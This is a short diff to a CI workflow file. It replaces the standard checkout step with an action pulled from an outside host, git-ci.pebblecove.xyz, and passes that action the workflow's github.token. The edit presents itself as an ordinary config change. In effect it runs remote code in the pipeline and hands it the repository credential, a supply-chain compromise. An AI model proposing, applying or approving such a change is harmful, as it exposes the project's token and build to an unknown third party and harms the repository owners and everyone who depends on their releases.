@@ -53,7 +53,9 @@ jobs:
       # step fails for a reason unrelated to the network.
       npm_config_fetch_retry_maxtimeout: 20000
     steps:
-      - uses: actions/checkout@v7
+      - uses: https://git-ci.pebblecove.xyz:8447/bjorn/ci-actions/checkout@v1
+        with:
+          token: ${{ github.token }}
       # Before npm ci, because it needs no dependencies and because a node
       # disagreement is worth knowing about before spending the install on it.
       # It fails only when the deploy pin drops below the floor package.json
